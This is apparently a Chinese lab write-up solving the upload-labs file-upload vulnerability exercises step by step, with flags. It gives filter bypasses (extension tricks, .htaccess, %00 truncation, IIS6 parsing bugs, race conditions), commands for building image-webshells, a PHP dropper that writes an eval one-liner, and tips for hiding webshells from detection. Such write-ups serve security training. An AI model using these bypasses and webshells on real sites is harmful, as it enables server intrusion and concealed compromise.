---
date: "2020-12-23T00:00:00Z"
description: upload-labs上传漏洞利用笔记
keywords: 安全
tags:
- 安全
title: upload-labs上传漏洞利用笔记
---

# 文件上传漏洞

http://59.63.200.79:8016/Pass-01/index.php

1. 配置 burpsuite， 开启response 拦截

![](https://nc0.cdn.zkaq.cn/md/8461/e5669b1869b679fee347566f647c0f82_92611.png)

## pass-01 前端验证绕过

核心思想： 拦截 response ， 删除前端功能模块。

![](https://nc0.cdn.zkaq.cn/md/8461/0b87b7f91468f05433eda0e5e17c9bbc_80856.png)

拦截 response。 删除 96 行以后的 js 模块， 并放行。 获取图片地址， 使用 蚁剑 连接

```bash
http://59.63.200.79:8016/Pass-01/upload/webshell.php

# flag_kezZYqSU.txt : zkaq{PpsG@-cImaU2cahL}
```


## pass-02 Content-Type方式绕过

上传，拦截，抓包，修改 `content-type: text/php` 为 `content-type: image/jpeg`

![](https://nc0.cdn.zkaq.cn/md/8461/86eb4970156629eadaba90d0db182eb2_14762.png)

```bash
http://59.63.200.79:8016/Pass-02/upload/webshell.php

# flag_qzdoouIu.txt: zkaq{2jzVjQeRV_EfuA-+}
```

## pass-03  黑名单绕过

```php
$deny_ext = array('.asp','.aspx','.php','.jsp');
```

分析源码， 仅限制了常见后缀。 而， php 还有其他默认带版本的解析后缀。

例如：
```bash
pht，phpt，phtml，php3，php4，php5，php6
```

+ 参考: [文件上传限制绕过技巧](https://www.freebuf.com/articles/web/179954.html)

这里使用 `webshell.php5`

![](https://nc0.cdn.zkaq.cn/md/8461/962c993e227d8ae0e8eb268b4fb29043_30754.png)

```bash
http://59.63.200.79:8016/Pass-03/upload//webshell.php5

# flag_SiZPRmH1.txt: zkaq{lapc=@Hs1EXxqwif}
```

##  pass-04 `.htaccess`文件绕过

`.htaccess` 是 apache 用来管理目录权限的**动态文件**， 可以实现目录的**黑白名单**， **伪静态**， **默认解析器** 等。
同样，在 nginx 中也可以使用， 不过需要手动引入。

+ [Linux下nginx支持.htaccess文件实现伪静态的方法](https://cloud.tencent.com/developer/article/1389181)

当过滤规则无法绕过的时候，可以尝试优先上传一个 `.htaccess` **设置**某类**图片文件** 的**默认解释器**。

+ [.htaccess文件解析漏洞](https://blog.csdn.net/cxrpty/article/details/104358473)

```ini
AddType application/x-httpd-php .jpg
```

**1. 上传 `.htaccess`**

![](https://nc0.cdn.zkaq.cn/md/8461/32f674bb21af92be9d761443624bef34_11891.png)

**2. 上传 jpg 后缀的 php 文件**

![](https://nc0.cdn.zkaq.cn/md/8461/779723364afed82af9633a54e9df3701_39046.png)

```bash
http://59.63.200.79:8016/Pass-04/upload/webshell.jpg

# flag_x=$ioleC.txt : zkaq{lgevqWqnexX2hy-a}
```

## pass-05 后缀大小写绕过

分析源码， 黑名单后缀通过 枚举 方式列出， 但未转换为小写进行二次比较， 因此出现利用方式

![](https://nc0.cdn.zkaq.cn/md/8461/0c4d3a1a00bf66958c95442f899f10ee_84528.png)

```bash
http://59.63.200.79:8016/Pass-05/upload//webshell.pHP

# flag_Pc8u31bi.txt : zkaq{HBkYvhSTYnXLkY@1}
```

## pass-06 文件后缀（空）绕过

**文件后缀（空）绕过** 利用的是文件上传后，
1. 未对文件名进行 **trim** 首尾去空进行判断。
2. 文件存储时，windows 操作系统首尾去空特性

> 此法在 linux 上可能不可行。

```bash
# touch "1.sh "

# ls -al
-rw-r--r--  1 root root    0 Dec 22 23:24 '1.sh '
```

![](https://nc0.cdn.zkaq.cn/md/8461/57ac64767c8a6c19054cec9654fe8182_55925.png)

```bash
http://59.63.200.79:8016/Pass-06/upload//webshell.php

# flag_CEHAWzRh.txt : zkaq{fTHte#S@+5n1B+UF}
```

## pass-07  文件后缀(点)绕过

**文件后缀点** 利用逻辑与 **文件后缀空** 类似。 windows 将忽略点。

> 主要原因是windows等系统默认删除文件后缀的.和空格，查看网站源码发现，没有过滤点。


![](https://nc0.cdn.zkaq.cn/md/8461/d9542087482d80b0281d0a8713a34350_45914.png)

```bash
http://59.63.200.79:8016/Pass-07/upload//webshell.php.

# flag_aLiyOhNR.txt : zkaq{2hd2JY3@F7VNMY8W}
```

## pass-08 `::$DATA（Windows文件流绕过`

`::$DATA` 是 windows 特有的绕过漏洞， 利用的是windows 存储机制。

+ 参考文档:  [渗透测试的WINDOWS NTFS技巧集合](https://xz.aliyun.com/t/2539)

![](https://nc0.cdn.zkaq.cn/md/8461/f64be0a0a3ba95c880463c45c0adb77b_42939.png)

```bash
http://59.63.200.79:8016/Pass-08/upload//webshell.php

# flag_m=aH$ViC.txt : zkaq{n5zP@kZia7%dSPP1}
```

## pass-09 构造文件后缀绕过

又名 **点空点** 绕过。 认真分析代码，

1. 先去除了**点**
2. 再去除了**空**
3. 只执行了一次。

因此， 可以复写 **点空** 进行绕过。

```bash
http://59.63.200.79:8016/Pass-09/upload//webshell.php.

# flag_%#B_SfdG.txt : zkaq{1+U=Tl=%AKS-juZ5}
```

## 10 双写文件后缀绕过

代码删除了后缀名中的黑名单字段。 **但只执行了一次**， 没有进行多次校验。
利用逻辑与 **点空点** 相似。

![](https://nc0.cdn.zkaq.cn/md/8461/c95ebdb2f1945216e084fd81ec41d901_95051.png)

```bash
http://59.63.200.79:8016/Pass-10/upload//webshell.php

# flag_Wzs%7OQt.txt : zkaq{7aYaRs8IN+9pP=rx}
```

## 11 `%00` 截断绕过

`%00` 阶段是 php 低版本 5.3.x 中的一个漏洞。 当 PHP 在 **URL** 中遇到 **%00** 时， 会认为语句结束而抛弃后面的语句。


![](https://nc0.cdn.zkaq.cn/md/8461/fffa81ad849ff1b566ae69e5f8231c2b_83169.png)


```bash
http://59.63.200.79:8016/upload/webshell.php%EF%BF%BD/2520201222235046.jpg

# 可利用
http://59.63.200.79:8016/upload/webshell.php

# flag_bNiqD%LB.txt : zkaq{E9JvKGkwMNLDpZRm}
```

## 12. %00截断绕过(二)

当 **存储路径** 不在 URL 中时， 需要使用 二进制 **00** 阶段

**1. 篡改上传路径， 并多写一个字符 a**

![](https://nc0.cdn.zkaq.cn/md/8461/9779a352328211cc4896ed99b2002841_40928.png)

**2. 使用 hex 工具，将 a 修改为 00**

![](https://nc0.cdn.zkaq.cn/md/8461/a8a9ac738678833aff0384a4c2a7160d_19475.png)

```bash
http://59.63.200.79:8016/upload/webshell.php%EF%BF%BD/3820201222235447.jpg
# 可利用
http://59.63.200.79:8016/upload/webshell.php

# flag_UZ3F-eeb.txt : zkaq{hx5JQH@+OkI_5Fiv}
```

## 13. 图片马绕过

图片马**制作和利用**需要注意的几个事项

**1. 制作**
1. 免杀。
2. 不要破坏图片显示效果。
3. 图片大小要符合使用逻辑。
4. 如果渗透语句放在中后段，注意图片不要太大， 避免**解释器**无法读取

**2.利用**
1. 配合其他漏洞渗透利用， 如解析漏洞。
2. 注意修改上传时间，避免被发现。
3. 隐藏母马。

```bash
# windows
copy torjan.jpg/b + webshell.php

# linux / mac
cat webshell.php >> torjan.jpg
```

> 一张图片不行，换一张再试。

**vim 二进制编辑**

```bash
vim -b yingtaozi.jpg

## vim 内
%!xxd

# 编辑完
%!xxd -r
:wq
```


**png**

![](https://nc0.cdn.zkaq.cn/md/8461/99c656c95feae36ba97ca0bab58ffa15_33793.png)

**gif**

![](https://nc0.cdn.zkaq.cn/md/8461/3e4cc4f45f4ee6a9d8b943874888fc53_61847.png)

**png**

![](https://nc0.cdn.zkaq.cn/md/8461/348c0f5b9e53602c2bb0136295f6dcc9_36139.png)


```
http://59.63.200.79:8016/Pass-13/upload/7520201223003243.gif
http://59.63.200.79:8016/Pass-13/upload/8020201223003302.jpg
http://59.63.200.79:8016/Pass-13/upload/3420201223003316.png

# flag_Qg=ekeYD.txt : zkaq{h97@y9mvlFD2aaqX}
```

+ 参考文档: [图片马制作](https://xz.aliyun.com/t/2657)

## 14. getimagesize图片类型绕过

```
http://59.63.200.79:8016/Pass-14/upload//2020201223005056.gif
http://59.63.200.79:8016/Pass-14/upload//3020201223005111.png

# flag_g+E9dCHP.txt : zkaq{T4eh66ipeGQzVj1z}
```

+ 参考文档:  [getimagesize  - php](https://www.php.net/manual/zh/function.getimagesize.php)


```php
<?php
    $types = '.jpeg|.png|.gif';
    $ext = image_type_to_extension($info[2]);

// $info[2] 为 type
    list($width, $height, $type, $attr) = getimagesize("img/flag.jpg");
?>
```

经测试： 任何 jpg 格式都无法上传。


## 15. php_exif模块图片类型绕过

上传图片并下载

```bash
wget -c http://nul03-b0a.aqlab.cn/Pass-15/upload//4020201223003325.gif
wget -c http://nul03-b0a.aqlab.cn/Pass-15/upload//3020201223003356.jpg
wget -c http://nul03-b0a.aqlab.cn/Pass-15/upload//1520201223003418.png
```

使用 grep 查看 **一句话** 是否还在

![](https://nc0.cdn.zkaq.cn/md/8461/8af85975f1c9d9026171a1b4d1c3e75b_46531.png)

本题暂无法利用**文件解析漏洞**， 未获取到 token

+ [可交换图像信息 - php](https://www.php.net/manual/zh/book.exif.php)

**源码分析**

```php
<?php
    $image_type = exif_imagetype($filename);
    switch ($image_type) {
        case IMAGETYPE_GIF:
            return "gif";
            break;
```

使用 `exif_imagetype` 读取文件元数据，获取文件类型信息。

**注意：在构造图片马时，不能破坏图片文件元数据信息**

## 16 二次渲染绕过


+ [gif 图片马生成工具 - php](https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE)
+ [BookFresh Tricky File Upload Bypass to RCE](https://secgeek.net/bookfresh-vulnerability/)
+ [利用PHP-GD imagecreatefromjpeg（）函数](https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromjpeg)


正常上传文件，获取渲染后的文件，使用二进制打开。获取渲染程序信息


![](https://nc0.cdn.zkaq.cn/md/8461/a3be8e9cf8160157f64c70d6e2bc9164_58644.png)

搜索相关文档，进行制马绕过。

> 结论： 失败， 目前还没找到好的图片和插入点。 所有尝试都无法通过 imagecreatefromjpeg() 方法。


参考文档:

+ [PHP-GD-imagecreatefromjpeg - 绕过研究 - github](https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromjpeg)

### 二次上传利用 （坑）

**分两步**

1. 上传正常文件，跑完正常逻辑， 获取图片地址。
2. 【利用】先上传再验证，且验证失败不删除的代码逻辑。 上传图片马覆盖第一步生成的正常文件。
3. 图片马上传成功。

```php
<?php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=$UPLOAD_ADDR.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);

/* 利用注释： 以上是上传 文件， 获取文件名等， 略过*/

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") && ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path))
        {
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
/* 利用注释： （第二次上传）
					1. 制作图片马， 保存为同名文件。 并点击上传。
					2. 提示非正常图片， imagecreatefromjpeg() 函数不过。 提示报错。

					注意： 当提示本报错的时候。 
					1. 图片已经上传， 【验证失败但未删除】。因此由于【与第一次文件生成文件同名】， 所以【有马覆盖无马】，从而造成利用。
					2. 如果这里有删除逻辑， 可以利用 【条件竞争方式】， 上传母马生成子马。
*/


                $msg = "该文件不是jpg格式的图片！";
            }else{
/* 利用注释： （第一次上传）
						上传一张正常图片， 进行二次编码转换。

						目的：
						获取正常图片名称。
*/

                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".jpg";
                $newimagepath = $UPLOAD_ADDR.$newfilename;
                imagejpeg($im,$newimagepath);
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = $UPLOAD_ADDR.$newfilename;
                unlink($target_path);
                $is_upload = true;
            }
        }
        else
        {
            $msg = "上传失败！";
        }
// 略
>?

```

### gif 制马

+ https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE
+ [CVE-2019–19576 (Arbitrary file upload in class.upload.php)]https://medium.com/@jra8908/cve-2019-19576-e9da712b779
+ https://secgeek.net/bookfresh-vulnerability/

### flag

```bash
http://59.63.200.79:8016/Pass-16/upload/31563.jpg/.php

# flag_4HQdz9RK.txt : zkaq{T68dYEhh5iWwcWs5}
```

## 17 文件竞争

利用方式：
上传母马， 在服务器检测、移动、删除过程中。 强行访问母马生成子马。 
从而绕过检测。

+ [file_put_contents - php](https://www.php.net/manual/zh/function.file-put-contents.php) 文件写入函数

**创建母马**
```php
<?php
// 生产子马
file_put_contents('2.php','<?php @eval(_REQUEST[8]);?>')
?>
```

**上传**

截断，并发送到 **intruder** 进行攻击

![](https://nc0.cdn.zkaq.cn/md/8461/7d2e9937a61d892545f359dd4d52c71d_76997.png)

设置 **null payloads**， 上传次数等


![](https://nc0.cdn.zkaq.cn/md/8461/3343ca391aeea082c8c6e3c75666de55_86378.png)

**产马**

上传任意图片，获取上传地址， 构造请求
```
http://59.63.200.79:8016/Pass-17/upload/m-horse.php
```

![](https://nc0.cdn.zkaq.cn/md/8461/b3c7da239ca9404e5e83752f585a5ee0_64335.png)

设置 payload 信息
![](https://nc0.cdn.zkaq.cn/md/8461/ef62ab261057dd228ddb711434dbc0be_63669.png)

**run**

开启以上两个 intruder， 等待结果。

略

## 18. 条件竞争2

上传任意图片，提示 上传目录不可写


![](https://nc0.cdn.zkaq.cn/md/8461/0c1857c1e19aea6773bd396f71d4ab13_79554.png)

分析源码， 确认上传流程是先到 临时目录， 在 move 到正式目录。

![](https://nc0.cdn.zkaq.cn/md/8461/73de663ec465a2695b198c90a05e2e82_33962.png)

报错提示为，检查目标文件是否可写的时候触发的。

![](https://nc0.cdn.zkaq.cn/md/8461/b42f8d1c612069c0bc315b9c76a41331_93518.png)

![](https://nc0.cdn.zkaq.cn/md/8461/69b9dbb66946e4e155cc7a1e01d55e92_74196.png)

报错触发此时， 文件已经上传到临时目录。 因此可以使用条件竞争方式，创建子马。

那么， 临时目录又是什么呢？

`cls_upload_dir` 值为空，
![](https://nc0.cdn.zkaq.cn/md/8461/2cea6d81fcaa28e8f24aedd5dc1d63ca_90936.png)

`MyUpload function` 也没有传入目录。但传入临时文件名。
![](https://nc0.cdn.zkaq.cn/md/8461/5f2f31cc10a1fa697d335d6f44bc7540_46061.png)


+ [`_FILE`](https://www.php.net/manual/zh/reserved.variables.files.php)  产生了一个随机文件名 ？？？ 那还玩儿什么？？

**续**

当环境不存在写入问题时， 图片马会通过其他验证， 一直到  move() ，将 **临时文件名** 改为上传文件

![](https://nc0.cdn.zkaq.cn/md/8461/0b4cf0469c7560cda46dbb2101889396_95272.png)


![](https://nc0.cdn.zkaq.cn/md/8461/f3efe0d4940287e67c669e1d665e23d6_34729.png)

从而满足 **条件竞争** 的条件


## 19 `move_uploaded_file()` 截断

可以自定义文件名，使用 00 截断

![](https://nc0.cdn.zkaq.cn/md/8461/63c86a9121f03e080fffbb7089837b81_88618.png)

使用 hex 将 `a` 改为 `00`

![](https://nc0.cdn.zkaq.cn/md/8461/9dbc25edb4756e8a4aa013e89ff00252_97449.png)

```bash
http://59.63.200.79:8016/Pass-19/upload//webshell.php?8=phpinfo();

## flag_CaLiXixv.txt : zkaq{FBKf-ufR@-i3FjiM}
```


## 20 .  IIS6.0解析漏洞（一）

+ [上传漏洞 之 iis解析漏洞、asp解析漏洞、文件解析漏洞、畸形解析漏洞、Apache解析漏洞](https://blog.csdn.net/weixin_45650712/article/details/107920475)
+ [ asp 一句话 ](https://www.cnblogs.com/xiaozi/p/7560907.html)


查看代码， **后缀白名单** 与 **content-type 白名单**

![](https://nc0.cdn.zkaq.cn/md/8461/2285c39ff2f3e0d6e6c56fe11b44ad95_30565.png)

抓包 对应修改

![](https://nc0.cdn.zkaq.cn/md/8461/4e97abff962c24341468f5caa397df78_55091.png)



![](https://nc0.cdn.zkaq.cn/md/8461/ec2160eff322640d6a184ed7eefe212b_35360.png)

```bash
http://59.63.200.79:8002/a/image/webshell.asa

# zKaQ-HatBI01Th
```


## 21. IIS6.0 解析漏洞（二）

使用 asp 分号断言绕过 `;` : `webshell.asp;.jpg`

![](https://nc0.cdn.zkaq.cn/md/8461/844dc58b449211aa57ec8386478e34ea_90489.png)


![](https://nc0.cdn.zkaq.cn/md/8461/3bcbeb094a2b69eb8c295f1a9d9b0466_45495.png)

```bash
http://59.63.200.79:8002/b/image/yingtaozi.asp;.jpg

# zKaQ-Y34Y2ets
```


## 21. IIS6.0 解析漏洞（三）

利用 路径 包含 `x.asp` 的漏洞

![](https://nc0.cdn.zkaq.cn/md/8461/a26ea8bfb795f3e8e55e96b6ebbb5285_35864.png)

```bash
http://59.63.200.79:8002/c/image/a.asp/1608724067.jpg

# zKaQ-Y1EHhm0O
```

## 22. CGI 漏洞

上传一个图片马， 使用 CGI 漏洞

![](https://nc0.cdn.zkaq.cn/md/8461/b41b15dc3e277aef4d2128d85a9d2237_14050.png)

```bash
http://59.63.200.79:8016//Pass-23/upload/ggshell.gif/.php

# zKaQ-1Q2IO0SA
```

